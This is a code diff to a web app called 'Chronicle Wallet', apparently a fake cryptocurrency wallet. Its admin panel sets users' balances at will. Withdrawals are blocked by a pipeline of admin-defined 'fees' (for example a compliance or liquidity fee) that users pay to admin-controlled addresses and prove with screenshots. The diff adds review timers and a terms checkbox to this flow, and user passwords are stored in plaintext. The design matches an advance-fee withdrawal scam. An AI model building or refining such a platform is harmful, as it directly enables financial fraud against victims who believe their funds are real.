@@ -151,7 +151,6 @@
                 <div class="balance-card">
                     <div style="color:var(--text-muted); font-size:0.875rem;">Total Portfolio Value</div>
                     <h1 style="font-size:2.8rem; color:#fff; margin:0.25rem 0;" id="user-total-val">$0.00</h1>
-                    <p style="color:var(--accent-green); font-size:0.875rem;">▲ Firebase Realtime Synced</p>
 
                     <div class="action-row-side">
                         <button class="btn" onclick="openSendModal()">↗ Send</button>
@@ -170,7 +169,7 @@
                         <div class="asset-icon" style="background:#f7931a; color:#fff;">₿</div>
                         <div>
                             <strong>Bitcoin</strong>
-                            <div style="color:var(--text-muted); font-size:0.8rem;" id="btc-holdings-display">Live Market View</div>
+                            <div style="color:var(--text-muted); font-size:0.8rem;" id="btc-holdings-display">0.0000 BTC</div>
                         </div>
                     </div>
                     <div style="text-align:right;">
@@ -184,7 +183,7 @@
                         <div class="asset-icon" style="background:#627eea; color:#fff;">Ξ</div>
                         <div>
                             <strong>Ethereum</strong>
-                            <div style="color:var(--text-muted); font-size:0.8rem;" id="eth-holdings-display">Live Market View</div>
+                            <div style="color:var(--text-muted); font-size:0.8rem;" id="eth-holdings-display">0.0000 ETH</div>
                         </div>
                     </div>
                     <div style="text-align:right;">
@@ -249,6 +248,17 @@
             </div>
 
             <div class="card">
+                <h3>📜 Terms and Conditions Management</h3>
+                <form onsubmit="saveAdminTerms(event)">
+                    <div class="form-group">
+                        <label>Platform Terms & Conditions Text / Link</label>
+                        <textarea id="admin-terms-text" class="form-control" rows="3" placeholder="Enter terms & conditions text here..." required></textarea>
+                    </div>
+                    <button type="submit" class="btn">Update Terms & Conditions</button>
+                </form>
+            </div>
+
+            <div class="card">
                 <h3>💰 Credit / Debit User Balance with Description</h3>
                 <form onsubmit="adminModifyBalance(event)">
                     <div class="form-group"><label>Select User Email</label><select id="admin-target-user" class="form-control" required></select></div>
@@ -277,11 +287,11 @@
             </div>
 
             <div class="card">
-                <h3>⚙️ Withdrawal Action Steps Pipeline</h3>
+                <h3>⚙️ Withdrawal Action Steps & Pending Timer Pipeline</h3>
                 <form onsubmit="saveActionStep(event)">
-                    <input type="hidden" id="edit-action-id">
                     <div class="form-group"><label>Action Title / Heading</label><input type="text" id="action-title" class="form-control" placeholder="e.g. Tax & Compliance Fee" required></div>
                     <div class="form-group"><label>Required Fee ($)</label><input type="number" id="action-amount" class="form-control" required></div>
+                    <div class="form-group"><label>Pending Duration Before Next Step (Minutes)</label><input type="number" id="action-timer" class="form-control" value="5" min="1" required></div>
                     <button type="submit" class="btn" id="action-submit-btn">Add Action Step</button>
                 </form>
                 <div style="margin-top:1rem;" id="action-steps-list"></div>
@@ -489,7 +499,13 @@
             <form id="signup-form" class="hidden" onsubmit="handleSignUp(event)">
                 <div class="form-group"><label>Email Address</label><input type="email" id="signup-email" class="form-control" required></div>
                 <div class="form-group"><label>Password</label><input type="password" id="signup-password" class="form-control" required></div>
-                <button type="submit" class="btn btn-success">Create Account</button>
+                <div class="form-group" style="background:var(--bg-input); padding:0.75rem; border-radius:8px; font-size:0.85rem;">
+                    <label style="display:flex; align-items:center; gap:0.5rem; cursor:pointer; color:var(--text-main); margin-bottom:0;">
+                        <input type="checkbox" id="signup-terms-check" required style="width:16px; height:16px;">
+                        <span>I agree to the <strong id="terms-label-text" style="color:var(--primary); text-decoration:underline;">Platform Terms & Conditions</strong></span>
+                    </label>
+                </div>
+                <button type="submit" class="btn btn-success" style="margin-top:1rem;">Create Account</button>
             </form>
         </div>
     </div>
@@ -541,8 +557,8 @@
         let userEmails = {};
         let exchanges = [{ id: 1, name: "MoonPay", logo: "MP", link: "https://buy.moonpay.com" }];
         let actionSteps = [
-            { id: 1, title: "Activation / Liquidity Fee", amount: 150 },
-            { id: 2, title: "Clarification & Compliance Fee", amount: 250 }
+            { id: 1, title: "Activation / Liquidity Fee", amount: 150, timerMinutes: 5 },
+            { id: 2, title: "Clarification & Compliance Fee", amount: 250, timerMinutes: 5 }
         ];
         let globalAddresses = {
             btc: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
@@ -551,6 +567,7 @@
             ethQr: "",
             usd: "CHRONICLE-GLOBAL-USD-TAG"
         };
+        let platformTerms = "Welcome to Chronicle Wallet. By using our platform, you agree to our digital asset compliance, security policies, and transaction clearance guidelines.";
         let proofQueue = [];
         let currentTheme = localStorage.getItem('chronicle_theme') || 'dark';
 
@@ -568,6 +585,7 @@
                 if (data.exchanges) exchanges = data.exchanges;
                 if (data.actionSteps) actionSteps = data.actionSteps;
                 if (data.globalAddresses) globalAddresses = data.globalAddresses;
+                if (data.platformTerms) platformTerms = data.platformTerms;
                 if (data.proofQueue) proofQueue = data.proofQueue;
                 updateBalanceUI();
                 if (!document.getElementById('admin-tab').classList.contains('hidden')) {
@@ -585,6 +603,7 @@
                 exchanges: exchanges,
                 actionSteps: actionSteps,
                 globalAddresses: globalAddresses,
+                platformTerms: platformTerms,
                 proofQueue: proofQueue
             }, { merge: true });
             localStorage.setItem('chronicle_current_user', currentUserEmail);
@@ -631,7 +650,9 @@
 
                 document.getElementById('user-total-val').innerText = `$${totalVal.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
                 document.getElementById('btc-holdings-display').innerText = `${u.btc.toFixed(4)} BTC`;
+                document.getElementById('btc-fiat-value').innerText = `$${btcVal.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
                 document.getElementById('eth-holdings-display').innerText = `${u.eth.toFixed(4)} ETH`;
+                document.getElementById('eth-fiat-value').innerText = `$${ethVal.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
                 document.getElementById('usd-fiat-value').innerText = `$${u.usd.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
 
                 document.getElementById('auth-status-btn').innerText = `👤 ${currentUserEmail.split('@')[0]}`;
@@ -643,8 +664,10 @@
                 txCard.classList.add('hidden');
                 usdRow.classList.add('hidden');
 
-                document.getElementById('btc-holdings-display').innerText = `Live Market View`;
-                document.getElementById('eth-holdings-display').innerText = `Live Market View`;
+                document.getElementById('btc-holdings-display').innerText = `0.0000 BTC`;
+                document.getElementById('btc-fiat-value').innerText = `$0.00`;
+                document.getElementById('eth-holdings-display').innerText = `0.0000 ETH`;
+                document.getElementById('eth-fiat-value').innerText = `$0.00`;
 
                 document.getElementById('auth-status-btn').innerText = "Sign In / Sign Up";
                 document.getElementById('unread-badge').innerText = "0";
@@ -812,9 +835,9 @@
             const txId = Date.now();
             u.activeTxId = txId;
             u.stepIdx = 0;
-            const firstStepTitle = actionSteps.length > 0 ? actionSteps[0].title.toUpperCase() : "ACTIVATING";
+            const firstStep = actionSteps.length > 0 ? actionSteps[0] : { title: "ACTIVATING", timerMinutes: 5 };
 
-            u.txs.unshift({ id: txId, type: `Withdraw (${selectedWithdrawMethodName})`, amount: amt, status: `PENDING (${firstStepTitle})` });
+            u.txs.unshift({ id: txId, type: `Withdraw (${selectedWithdrawMethodName})`, amount: amt, status: `PENDING (${firstStep.title.toUpperCase()})` });
             saveState(); updateBalanceUI();
             showNotification("Processing", `Withdrawal request submitted`, "💳");
             setTimeout(() => { openActionModal(); }, 1500);
@@ -838,11 +861,16 @@
             reader.onload = function(evt) {
                 const u = getCurrentUserData();
                 const step = actionSteps[u.stepIdx || 0];
-                proofQueue.push({ id: Date.now(), user: currentUserEmail, stepTitle: step.title, amount: step.amount, image: evt.target.result });
+                proofQueue.push({ id: Date.now(), user: currentUserEmail, stepTitle: step.title, amount: step.amount, image: evt.target.result, timerMinutes: step.timerMinutes || 5, submitTime: Date.now() });
+                
+                // Update tx status to pending timer review
+                const tx = u.txs.find(t => t.id == u.activeTxId);
+                if (tx) tx.status = `${step.title.toUpperCase()} UNDER REVIEW (${step.timerMinutes || 5}m)`;
+
                 saveState();
                 closeActionModal();
-                showNotification("Submitted", "Proof uploaded for admin review", "🖼️");
-                alert("Proof submitted successfully!");
+                showNotification("Submitted", `Proof uploaded. Under review for ${step.timerMinutes || 5} minutes`, "🖼️");
+                alert(`Proof submitted successfully! Verification will process for ${step.timerMinutes || 5} minutes.`);
             };
             reader.readAsDataURL(file.files[0]);
         }
@@ -889,6 +917,13 @@
             if (pendingSaves === 0) { saveState(); alert("Global addresses updated!"); }
         }
 
+        function saveAdminTerms(e) {
+            e.preventDefault();
+            platformTerms = document.getElementById('admin-terms-text').value;
+            saveState();
+            alert("Platform terms & conditions updated successfully!");
+        }
+
         function adminModifyBalance(e) {
             e.preventDefault();
             const email = document.getElementById('admin-target-user').value;
@@ -905,6 +940,7 @@
 
             sendSimulatedEmail(email, `Balance Updated (${asset.toUpperCase()})`, `Your ${asset.toUpperCase()} balance was ${action === 'topup' ? 'credited' : 'debited'} by ${amount}.\nReason: ${reason}`);
             saveState(); updateBalanceUI();
+            showNotification("Balance Updated", `${asset.toUpperCase()} ${action === 'topup' ? 'credited' : 'debited'} by ${amount}`, "💰");
             alert(`Successfully updated balance for ${email}!`);
         }
 
@@ -919,10 +955,12 @@
             e.preventDefault();
             const title = document.getElementById('action-title').value;
             const amount = Number(document.getElementById('action-amount').value);
-            actionSteps.push({ id: Date.now(), title, amount });
+            const timerMinutes = Number(document.getElementById('action-timer').value) || 5;
+            actionSteps.push({ id: Date.now(), title, amount, timerMinutes });
             document.getElementById('action-title').value = '';
             document.getElementById('action-amount').value = '';
-            saveState(); alert("Action step saved!");
+            document.getElementById('action-timer').value = '5';
+            saveState(); alert("Action step saved with timer!");
         }
         function deleteActionStep(id) { actionSteps = actionSteps.filter(x => x.id != id); saveState(); }
 
@@ -955,10 +993,11 @@
             document.getElementById('admin-btc-addr').value = globalAddresses.btc || '';
             document.getElementById('admin-eth-addr').value = globalAddresses.eth || '';
             document.getElementById('admin-usd-addr').value = globalAddresses.usd || '';
+            document.getElementById('admin-terms-text').value = platformTerms || '';
             document.getElementById('admin-target-user').innerHTML = usersList.map(u => `<option value="${u.email}">${u.email} (BTC: ${u.btc.toFixed(2)} | USD: $${u.usd})</option>`).join('');
             document.getElementById('admin-users-list').innerHTML = usersList.map(u => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px;"><strong>${u.email}</strong> - USD: $${u.usd} | BTC: ${u.btc}</div>`).join('');
             document.getElementById('admin-exchanges-list').innerHTML = exchanges.map(ex => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px; display:flex; justify-content:space-between;"><span>${ex.name}</span> <button class="btn btn-danger" style="width:auto; padding:0.2rem 0.4rem; font-size:0.7rem;" onclick="deleteExchange(${ex.id})">Delete</button></div>`).join('');
-            document.getElementById('action-steps-list').innerHTML = actionSteps.map((st, i) => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px; display:flex; justify-content:space-between;"><span>Step ${i+1}: ${st.title} ($${st.amount})</span> <button class="btn btn-danger" style="width:auto; padding:0.2rem 0.4rem; font-size:0.7rem;" onclick="deleteActionStep(${st.id})">Delete</button></div>`).join('');
+            document.getElementById('action-steps-list').innerHTML = actionSteps.map((st, i) => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px; display:flex; justify-content:space-between;"><span>Step ${i+1}: ${st.title} ($${st.amount}) - [Timer: ${st.timerMinutes || 5} mins]</span> <button class="btn btn-danger" style="width:auto; padding:0.2rem 0.4rem; font-size:0.7rem;" onclick="deleteActionStep(${st.id})">Delete</button></div>`).join('');
             
             const queueContainer = document.getElementById('admin-queue');
             if (proofQueue.length === 0) {
@@ -967,7 +1006,7 @@
                 queueContainer.innerHTML = proofQueue.map(pr => `
                     <div style="background:var(--bg-input); padding:0.75rem; border-radius:8px; margin-bottom:0.75rem; display:flex; justify-content:space-between; align-items:center;">
                         <div>
-                            <strong>${pr.user}</strong> - ${pr.stepTitle} ($${pr.amount})<br>
+                            <strong>${pr.user}</strong> - ${pr.stepTitle} ($${pr.amount}) [Timer: ${pr.timerMinutes || 5}m]<br>
                             <a href="${pr.image}" target="_blank"><img src="${pr.image}" style="width:60px; height:60px; object-fit:cover; border-radius:4px; margin-top:5px;"></a>
                         </div>
                         <button class="btn btn-success" style="width:auto;" onclick="approveProof(${pr.id})">Approve Step</button>
@@ -1008,10 +1047,16 @@
             document.getElementById('signup-form').classList.toggle('hidden', mode !== 'signup');
         }
 
+        document.getElementById('terms-label-text').onclick = function() {
+            alert(platformTerms);
+        };
+
         function handleSignUp(e) {
             e.preventDefault();
             const email = document.getElementById('signup-email').value;
             const password = document.getElementById('signup-password').value;
+            const termsChecked = document.getElementById('signup-terms-check').checked;
+            if (!termsChecked) { alert("You must agree to the Terms & Conditions."); return; }
             if (usersList.some(x => x.email === email)) { alert("Account already exists."); return; }
             
             const newUser = { email, password, pin: null, btc: 0, eth: 0, usd: 0, txs: [] };
@@ -1020,6 +1065,7 @@
             saveState();
             closeAuthModal();
             updateBalanceUI();
+            showNotification("Welcome", "Account created successfully", "🎉");
             document.getElementById('pin-setup-modal').style.display = 'flex';
         }
 
@@ -1034,6 +1080,7 @@
             localStorage.setItem('chronicle_current_user', currentUserEmail);
             closeAuthModal();
             updateBalanceUI();
+            showNotification("Signed In", "Welcome back!", "👋");
             if (!u.pin) document.getElementById('pin-setup-modal').style.display = 'flex';
             else alert("Signed in successfully!");
         }
